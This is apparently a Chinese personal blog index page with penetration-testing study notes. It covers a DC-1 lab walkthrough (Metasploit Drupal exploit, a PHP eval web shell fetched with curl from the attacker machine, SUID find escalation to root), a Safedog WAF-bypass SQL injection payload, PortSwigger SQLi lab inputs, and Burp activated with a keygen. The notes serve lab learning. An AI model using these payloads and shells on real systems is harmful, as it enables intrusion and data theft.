<p> |<br>| inanchor: | 把搜索范围限定在链接锚文本文字中 | inanchor:吴清源 |<br>| anchor: | 检索某一作者&#x2F;发明人的论著; 只在Google Scholar中可用 | anchor:&#x2F;作者: |<br>| link： | 检索所有链接到某个特定URL网址的网页;只能单独使用 | link:163.com |<br>| cache: | Google网页快照 | </p>
<p> |<br>| related： | 检索与某特定网页类似的网页 | related:<a target="_blank" rel="noopener" href="http://www.163.com/index.shtml">www.163.com/index.shtml</a> |<br>| info: | 用来显示与某链接相关的一系列搜索; 提供cache、similar-pages、link、related等连接 | info:<a target="_blank" rel="noopener" href="http://www.sina.com.cn/">www.sina.com.cn</a> |<br>| Index  of | 可以帮助你寻找网络和FTP目录 | index  of mp3 |<br>| daterange: | 查找在一定的日期或者一定的日期范围内; 只关注被Google收录的时间 | </p>
<p> |<br>| location: | 指定地区区域内查询关键词相关的网页 | wow  gold location:France |<br>| weather: | 查询该地区或城市当前的天气状况 | weather:北京 |<br>| stocks: | 查询股票信息; 一般源于专业财经网站 | stocks:比亚迪 |<br>| define: | 返回包含查询关键词定义的网面 | define:  暗网 |<br>| 注意:关键词与命令之间有一个空格;在这些关键字中;请勿在冒号后面接空格;命令需用英文输入,包括冒号。AND、OR、NOT均应大写,而其他算符必须是小写，虽其对检索词完全不区分大小写 |  |  |</p>
<p>Google高级搜索<br><a target="_blank" rel="noopener" href="http://www.google.com.hk/advanced_search">http://www.google.com.hk/advanced_search</a><br>Google网页搜索帮助中心<br><a target="_blank" rel="noopener" href="https://support.google.com/websearch/?hl=zh-Hans">https://support.google.com/websearch/?hl=zh-Hans</a><br>谷歌分类目录<br><a target="_blank" rel="noopener" href="http://directory.google.com/">http://directory.google.com/</a><br>Google对于检索词中的大小写是完全不做区分的;在Google中，检索词的排序方式对于整个检索式具有重要的影响，它将首先匹配按照检索式给出的次序进行搜索。同时它也将优先匹配检索词相互邻接的网页。GOOGLE支持多达132种语言，包括简体中文和繁体中文，可以设置页面语言和搜索语言，可对汉字繁简体进行转换，可以跨语言搜索。Google搜索结果中可对搜索范围进行限制，如：网页的发布更新时间或一个时间段内，搜索结果的类型选择如图片、视频、书籍、应用程序、新闻。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-渗透基本流程 ,web打点，靶机攻破" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/06/%E6%B8%97%E9%80%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%20,web%E6%89%93%E7%82%B9%EF%BC%8C%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%A0%B4/" class="article-date">
      <time datetime="2024-01-06T10:33:47.000Z" itemprop="datePublished">2024-01-06</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/06/%E6%B8%97%E9%80%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%20,web%E6%89%93%E7%82%B9%EF%BC%8C%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%A0%B4/">渗透基本流程 ,web打点，靶机攻破</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><p>渗透整体分为三部分：前渗透也被称为外网打点，权限维持以及后渗透，权限维持也可划分到前渗透中。权限维持也包括提权，主机信息收集web打点，apk打点(安卓手机打点)，钓鱼等等最终目的都是为了获得权限。结构示意图：</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704534952980-63b8d063-fcf7-462f-a6c5-c6837434f385.png" alt="image.png"></p>
<h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>信息收集分情况进行处理：已知ip，已知域名，已知邮箱。</p>
<h2 id="已知ip"><a href="#已知ip" class="headerlink" title="已知ip"></a>已知ip</h2><h3 id="基于主机"><a href="#基于主机" class="headerlink" title="基于主机"></a>基于主机</h3><p>可以进行端口扫描，从而确定端口对应的服务，一共有65536(0~65535)个端口。浏览器也是如此，在浏览器上每开启一个页面都要在本地建立端口于远端服务器进行连接。在web服务(浏览器)上就可以进行目录扫描，通过目录扫描发现信息泄露，如果没有进行校验还会发生越权或者目录穿越。web服务上面还会发现ssh，ftp，smb，RDP，寻找API(可能存在is之中)，根据ico图标找相关站点等服务，其中的密码都可以进行爆破。简单的用户名和密码，组织统一注册的用户名和密码，历史密码拼接容易被爆破。还可以进行强制爆破。以上种种情况基于主机。</p>
<h3 id="反查"><a href="#反查" class="headerlink" title="反查"></a>反查</h3><p>根据ip地址反查域名通过微步在线进行反查通过在微步进行服务器ip地址的查询可以看到绑定的图标以及ip解析的域名，相关网站，网页的js以及ip开饭的端口等信息均可以查到。根据图标也可能会被查到相关信息。<a target="_blank" rel="noopener" href="https://x.threatbook.com/v5/circleIntroduction">微步在线X情报社区-威胁情报查询威胁分析平台开放社区</a></p>
<h3 id="2-1-3ip定位"><a href="#2-1-3ip定位" class="headerlink" title="2.1.3ip定位"></a>2.1.3ip定位</h3><h2 id="已知域名"><a href="#已知域名" class="headerlink" title="已知域名"></a>已知域名</h2><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>举个简单的例子：<a target="_blank" rel="noopener" href="https://www.baidu.com/">www.baidu.com</a>就是域名域名（Domain Name）是用于在互联网上标识和定位网站或互联网资源的人类可读的地址。它是将IP地址（用于在网络上唯一标识设备）转化为易于记忆的字符序列的方式。域名的结构通常由多个部分组成，以点（.）作为分隔符。最顶层的部分被称为顶级域名（Top-Level Domain，简称TLD），如.com、.org、.net等。顶级域名可以按照国家&#x2F;地区（如.cn表示中国）、通用（如.com表示商业）、组织类型（如.edu表示教育机构）等进行分类。在顶级域名下面，可以添加二级域名和更多级别的子域名。域名的作用是方便用户记忆和使用，它提供了一个更友好和可读性更高的方式来访问网站和互联网资源，而不是依赖于记忆一长串数字的IP地址。当用户在浏览器中输入域名时，系统将通过域名解析将其转换为相应的IP地址，以便正确访问目标资源。</p>
<h3 id="域名备案"><a href="#域名备案" class="headerlink" title="域名备案"></a>域名备案</h3><p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a>通过这个地址查看域名备案<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a>通过域名备案可以查到邮箱，姓名，主体，服务备案号，通过备案号可以查其他相关网站。通过备案号加上引号进行百度搜索</p>
<h2 id="已知邮箱"><a href="#已知邮箱" class="headerlink" title="已知邮箱"></a>已知邮箱</h2><p><a target="_blank" rel="noopener" href="https://www.reg007.com/">https://www.reg007.com/</a>通过这个网站搜索邮箱，手机号可以看到注册过的一些相关网页或者应用，不过比较鸡肋的是必须证明是本人进行查询，还需要发送验证码。<a target="_blank" rel="noopener" href="https://www.reg007.com/">你注册过哪些网站？一搜便知 - REG007</a>已知邮箱可以查询到姓名，手机号，历史密码，身份证，户口本，淘宝记录。整体流程图：</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704536845149-c7318898-1a57-4123-97f6-2f29c945f089.png" alt="image.png"></p>
<h1 id="靶机攻破"><a href="#靶机攻破" class="headerlink" title="靶机攻破"></a>靶机攻破</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.准备好DC1靶机和kali linux虚拟机两台设。2.由于一开始不知道DC1靶机的ip地址，可以将两台设备调整为nat模式，对DC1进行查看物理地址并记录下来<br>DC1的mac地址：00:0C:29:0D:49:7C<br>3.kali linux虚拟机通过ifconfig找到当前的ip地址<br>etho：192.168.17.132<br>4.通过nmap端口扫描找到DC1的IP地址：namp -sn 192.168.17.132&#x2F;24 “其中-sn”参数指定了 nmap 工具执行 “Ping Scan”，即使用 ICMP 回应来确定目标主机是否存活。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令：namp -sn 192.168.17.132/24</span><br><span class="line">得出DC1的IP：192.168.17.133</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704091615731-24f43c74-c974-45e3-802e-a510ce7e8cf2.png"></p>
<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><p>1.通过此命令查看DC1的基本信息：nmap -sS 192.168.17.133 -A</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704092567178-54de0a76-63b1-44cb-881b-570720c25d74.png"></p>
<p>2.通过此命令查看DC1的全端口信息：nmap -p- 192.168.17.133</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704092890218-39a06a68-9eb7-4744-bedb-80a6a5a7afbb.png"></p>
<p>3.确定版本：nmap -p 80 -sV 192.168.17.133,由于自己试过无法主机无法到达，因为两个虚拟机都选择的是nat模式所以无法互相拼通。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704094358883-fbdc679d-d33d-41d9-ae85-dd9ae4e5701d.png"></p>
<p>再在kali机上面打开浏览器搜索192.168.17.133:80,关键字是:Drupal Site ,用sql注入进行尝试发现没啥用处，邮箱注册发送也没用</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704094392970-8a2f5cd7-0d79-46f5-9240-fd5b523c67ba.png"></p>
<p>4.进行目录扫描：dirsearch -u 192.168.17.133 -x 403，404 -t 50 </p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704096389841-ac8a1e9b-072f-46cc-992a-ddafb4cd2c22.png"></p>
<p>在网页后面加上&#x2F;robots.txt。这个文件是一个爬虫文件。robots.txt 是一个用于指导网络爬虫的文件。它是位于网站根目录下的一个文本文件，用于向搜索引擎和其他网络爬虫提供关于网站爬取规则的指示。当搜索引擎的爬虫访问一个网站时，它会首先查找并读取 robots.txt 文件。该文件中包含了一些指令，告诉爬虫哪些网页可以被爬取，哪些不可以。通过 robots.txt，网站管理员可以控制搜索引擎爬虫在访问网站时的行为，例如禁止爬虫访问某些特定的页面、目录或文件。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704096070188-0a24b7ba-1294-4cdf-b5c1-9d865689d136.png">再去看一下&#x2F;UPGRADE.txt可以发现Drupal是一个框架，当前版本是7.0，百度搜索一下，发现版本比较老，可能存在漏洞。</p>
<h2 id="msf尝试进行攻击："><a href="#msf尝试进行攻击：" class="headerlink" title="msf尝试进行攻击："></a>msf尝试进行攻击：</h2><p>启动msf:msfconsole</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097120601-d2cc9855-7416-4f9e-8f1e-efaeaf41708f.png"></p>
<p>搜索框架漏洞：search drupal</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097235060-b53250b7-22e8-41ab-92f8-888304e867d6.png"></p>
<p>发现存在这些漏洞，一个个进行尝试，最后发现第二个能够成功。尝试用use 0会话没有创建成功，用use 2成功创建会话。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097625687-a4dd0a8f-65f5-45b7-a4bf-608ef5e3cbd8.png"></p>
<p>show options查看必须要设置的选项</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097681635-0fe434fc-e915-475e-85a7-402942ec824b.png"><br>set rhosts <strong>192.168.17.133#这个ip是DC1的ip</strong></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097841942-f3bafd92-e046-4117-b3c1-53a674e19447.png"><br>run一下出现这个说明伪终端创建成功。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704098022861-603ca049-568b-4d66-98ab-6687d5252cad.png"></p>
<h2 id="尝试提权："><a href="#尝试提权：" class="headerlink" title="尝试提权："></a>尝试提权：</h2><p>shell一下，ls查看一下：</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704098161189-d1c2a46f-ee02-4254-b0ab-5ee51f642b65.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704098208918-dddb4c1f-0bae-43f5-9395-73222fb9262c.png"><br>pwd当前位置，whoami我是谁</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704098359199-0c718927-46e0-4977-a2b2-52ea54c02da9.png"><br>cat flag1.txt</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099049092-539eb57c-1e57-4dc8-83f7-f5285a88cfda.png"></p>
<h2 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h2><p>CMS 是内容管理系统（Content Management System）的缩写。它是一种用于创建、编辑、管理和发布内容的软件系统或工具。一个 CMS 提供了一系列的功能和工具，使用户可以轻松地创建、组织和发布内容，无需编写代码或进行复杂的技术操作。它通常包括用户管理、内容编辑、模板设计、发布管理等功能。使用 CMS，用户可以创建和管理各种类型的网站，例如博客、新闻门户、企业网站、电子商务网站等。CMS 提供了易于使用的界面和工具，允许用户通过简单的操作来添加、编辑或删除页面内容、图像、视频、文章等，而无需涉及复杂的编程和设计知识。一些常见的 CMS 包括 WordPress、Drupal、Joomla 等，它们都是广泛用于构建和管理网站的流行软件系统。通过使用 CMS，用户能够方便地管理网站的内容，使网站的维护和更新更加高效和简单。</p>
<h2 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h2><p>where curl #curl类似于一个命令行工具或者库</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099285441-aefcacab-3400-4c6d-a02f-f91321f66138.png"></p>
<p>输入curl出现帮助手册说明存在。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099382857-a087ef21-36cc-451a-bd90-c19d11e38908.png"></p>
<p>curl <a target="_blank" rel="noopener" href="https://www.baidu.com/">www.baidu.com</a></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099478702-f1bc2532-f915-498b-befc-0852c39a96b2.png"></p>
<p>在桌面新建一个1.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_GET[cmd]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099768665-38421335-8090-4172-a06f-99ad968ad8c0.png"></p>
<p>重新开一个cmd窗口输入python -m http.server 80#意思是说将当前目录设置为网站根目录。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100698868-cb6e5f0f-9c78-49a2-8afd-13bb4adabce0.png"><a target="_blank" rel="noopener" href="http://192.168.17.132/">http://192.168.17.132</a> -o 1.php</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100876363-b625babc-13a8-4ad1-ac86-19c5ebf2d5ca.png"></p>
<p>ls发现上传成功。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100921325-dbbf9a27-02c4-4540-8588-7a274308e7a7.png"><br>cat 1.php出现其他的内容说明上传的方式错了，上传了个下载连接地址。正确的方式是这样的：curl <a target="_blank" rel="noopener" href="http://192.168.17.132/1.php">http://192.168.17.132/1.php</a> -o 2.php</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101099861-4ba79589-8d60-4084-8a0f-f93a33300d1d.png"></p>
<p>cat 2.php</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101442272-d3c78ef4-de18-4d1c-80cb-57f900b9e568.png"></p>
<p>成功之后调用系统命令执行函数。192.168.17.133&#x2F;2.php?cmd&#x3D;sytem(ls);</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101508378-94efa053-014e-43bf-8545-f649153039e3.png"></p>
<p>通过木马获取权限，这是一种办法。</p>
<h2 id="短暂获取权限："><a href="#短暂获取权限：" class="headerlink" title="短暂获取权限："></a>短暂获取权限：</h2><p>python加强一下shell权限：python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”#使用交互shell<br>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704102099589-99c9586a-cf89-4c12-a6e5-be70a7281f24.png">                               </p>
<p>find提权：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null#这里利用SUID进行提权，查看SUID的二进制可执行文件。<br>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null<br>解释：find 是一个命令，用于在文件系统中搜索文件或目录。&#x2F; 是搜索的起始点，表示从根目录开始搜索。-user root 是一个选项，表示搜索属主为 root 的文件或目录。-perm -4000 是另一个选项，表示搜索权限设置为 4000（八进制表示）的文件或目录。其中的 - 表示匹配减去指定权限后的结果，4000 则对应 SUID 权限位。-print 是一个选项，表示找到匹配的文件或目录时打印出它们的路径。最后的 2&gt;&#x2F;dev&#x2F;null 是将搜索过程中产生的错误信息（标准错误输出）重定向到 &#x2F;dev&#x2F;null 设备中，以避免显示错误信息。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704102314135-8d6ce1e0-5b70-46f2-b26d-c1fe9ef1fffd.png"></p>
<p>find &#x2F; -name cron.php -exec “&#x2F;bin&#x2F;sh” ; #利用find获取root权限id查看当前的用户。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704103236731-3f110ef3-b580-42e4-851d-330f2d65b1d1.png"></p>
<p>cd &#x2F;root切换到root根目录ls 发现最终的flagcat theflnalfalg.txt 查看文件内容</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704103344531-6a88df95-4dbd-4155-9fe9-c635e20d6078.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-安全狗的安装，WAF绕过，SQL注入Oracle数据库，Burp的安装与使用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/01/%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E5%AE%89%E8%A3%85%EF%BC%8CWAF%E7%BB%95%E8%BF%87%EF%BC%8CSQL%E6%B3%A8%E5%85%A5Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8CBurp%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="article-date">
      <time datetime="2024-01-01T14:07:33.000Z" itemprop="datePublished">2024-01-01</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/01/%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E5%AE%89%E8%A3%85%EF%BC%8CWAF%E7%BB%95%E8%BF%87%EF%BC%8CSQL%E6%B3%A8%E5%85%A5Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8CBurp%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">安全狗的安装，WAF绕过，SQL注入Oracle数据库，Burp的安装与使用</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="安全狗的安装"><a href="#安全狗的安装" class="headerlink" title="安全狗的安装"></a>安全狗的安装</h2><p>1.在虚拟机win10浏览器的安全狗官网，链接：<a target="_blank" rel="noopener" href="https://www.safedog.cn/">https://www.safedog.cn/</a>     在首页的免费安全产品下载网站安全狗。下载后先不要安装。<br>2.关闭小皮的Apache，加入一个新的Apache到系统服务中，管理员权限打开<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=dos%E5%91%BD%E4%BB%A4&spm=1001.2101.3001.7020">dos命令</a>面板，进入phpstudy_pro\Extensions\Apache2.4.39\bin文件夹，输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd.exe -k install -n apache2.4</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703923927662-0a71ce58-3788-4976-9b87-bfb04d28c63d.png" alt="image.png"><br>3.安装完成后打开系统服务列表查看是否安装成功。win+r ，services.msc。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703924194205-137e4869-69af-4c52-8ac7-40f316fe14fa.png" alt="image.png"><br>4.安全前先启动Apache2.4服务，点击安全狗安装包安装，安装目录自定义<br>5.用管理员权限启动安全狗。</p>
<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>1.WAF（Web应用防火墙）是一种安全解决方案，旨在保护Web应用程序免受各种攻击，如SQL注入、跨站脚本（XSS）和命令执行等。然而，由于WAF通常基于正则表达式和预定义的规则集来检测攻击，因此存在被绕过的可能性。<br>2.WAF绕过方法总结，链接:<br><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15072903/4074643">WAF绕过方法总结_51CTO博客_如何绕过waf</a><br>3.安装了安全狗后，以sqli的第1关为例<br>输入<code>?id=1&#39; union select</code>,被安全狗的过滤规则检测到了<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703926489604-9c1db1db-d658-419e-8c86-4769d0d96022.png" alt="image.png"><br>4.打开Yakit软件，把第一关链接192.168.2.2&#x2F;sqli&#x2F;Less&#x2F;?id&#x3D;1复制到Yakit内置浏览器，然后抓包。<br>5.点击Fuzz，然后在下图位置插入字典。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703927865832-e7d97cc8-d142-480e-ae9c-58453e4c949b.png" alt="image.png"><br>6.字典中添加如下内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704091196967-1b6ad3ce-fc70-4816-95a7-914469d17e7b.png" alt="image.png"><br>7.点击发送请求，1,2行数据报错，原因是字典中的空格没有编码。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704091317501-59a742e3-933d-4fa4-b207-6adf649c2352.png" alt="image.png"><br>8.给空格编码%20后，1，2行数据没有报错了。响应大小为5276说明被安全狗拦截了。4~8整个过程被称为模糊测试。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704091836408-6b5ba193-d829-452b-84ac-3a819cbbe172.png" alt="image.png"></p>
<p>9.在12345处插入6位验证码<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704092850626-f66efa29-7940-4091-a927-1207860dfe92.png" alt="image.png"><br>10.得到我们需要的payloads<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704093298003-42fd35f4-ff58-4816-aab3-b0d09e84435b.png" alt="image.png"><br>11.把之前的12345换成00044<br>12.输入以下代码：<br><code>?id=0&#39;union/*//*//*!00044select*/1,/*//*/!00044database*//*//*//*!00044()*/,3-- -</code><br>结果成功绕过安全狗：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704093728644-e0d33e6f-b6a1-4357-a42d-a38e18f24af2.png" alt="image.png"></p>
<h2 id="SQL注入Oracle数据库"><a href="#SQL注入Oracle数据库" class="headerlink" title="SQL注入Oracle数据库"></a>SQL注入Oracle数据库</h2><p>1.访问靶场网站，链接：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs">https://portswigger.net/web-security/all-labs</a>    注册并登录<br>2.第一关，右键翻译网页，溶液代表答案，然后访问实验室。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704096500832-6383d77a-1822-484a-bc9c-a0537242ffae.png" alt="image.png"><br>3.在地址栏输入以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter?category=%27+OR+1=1--</span><br></pre></td></tr></table></figure>

<p>成功注入，结果如下:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097664693-eaf05e4f-57b5-4ea4-8520-ef490c5c8679.png" alt="image.png"></p>
<p>3.第二关，是SQL注入登录框  username填administrator’–，密码是随机的，填1<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704098378506-87a87d3b-cbe1-4c77-b406-c39f80a7f377.png" alt="image.png"></p>
<p>成功注入，结果如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704098169171-41e3c47d-77a8-4780-bbef-7d4fabf0ef8b.png" alt="image.png"></p>
<h2 id="Burp的安装与使用"><a href="#Burp的安装与使用" class="headerlink" title="Burp的安装与使用"></a>Burp的安装与使用</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1.下载并安装Burp抓包软件（半汉化版），官网链接：<a target="_blank" rel="noopener" href="https://portswigger.net/burp">https://portswigger.net/burp</a><br>2.cmd打开这个路径<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099517933-ca05e238-4f50-46e5-a61c-672dfb2bf9cf.png" alt="image.png"><br>3.在命令窗口输入<code>Java -vision</code>确认java版本是java19<br>再输入<code>java -jar burp-loader-keygen-2_1_06.jar</code>然后会弹出下面的窗口<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099918098-4560d7e0-6f8d-4082-ab16-dbeaa56809ea.png" alt="image.png"><br>4.然后再双击汉化启动。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099987988-6c2f6504-bbc1-4feb-b1fb-55c2d69c3f8c.png" alt="image.png"><br>5.把左边的License复制到右边，点击下一步&#x3D;&gt;手动激活。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100090794-9822c05b-cac7-4b5c-ae09-8efafe815648.png" alt="image.png"><br>6.过程1：把右边内容复制到左边<br> 过程2：把左边下方内容复制到右边下方<br>点击下一个，激活成功<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100270809-953b141b-b872-4df5-adcb-93610018d4ab.png" alt="image.png"></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>1.sqli第一关，用Burp抓包。依次点击Proxy–&gt;intercept–&gt;打开内置浏览器–&gt;复制第一关的链接粘贴到内置浏览器–&gt;HTTP history–&gt;对应的数据包<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100894006-a526597e-2688-40b2-a763-995a0f90cb74.png" alt="image.png"><br>2.用Burp爆破。右击数据包–&gt;发送到repeat<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101529865-2dc05e81-8d1b-42df-98bc-96ce3ee02698.png" alt="image.png" style="zoom:80%;" />3.    1-50迭代。右击数据包–&gt;发送到intruder     （intruder是爆破器 ）选择1–&gt;添加<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101973577-46b49ac2-6ccc-4b8a-a5d4-96c488729f8d.png" alt="image.png"><br>4.点击Payloads–&gt;Payloads  type选择Numbers–&gt;1  50  1–&gt;点击发送<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704102160879-12f3da70-3151-418b-b89b-913f8d34bcf4.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2016-2024 Tangxianshen
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
